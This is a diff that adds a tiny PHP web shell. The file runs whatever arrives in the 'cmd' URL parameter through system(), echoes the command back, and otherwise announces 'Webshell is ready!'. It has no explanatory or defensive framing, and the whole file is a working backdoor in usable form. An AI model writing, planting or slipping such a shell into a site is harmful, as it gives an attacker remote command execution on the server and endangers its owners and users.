@@ -1,0 +1,8 @@
+<?php 
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+    echo "<br><br>Command executed: " . $_GET['cmd'];
+} else {
+    echo "Webshell is ready! Use ?cmd=command";
+}
+?>
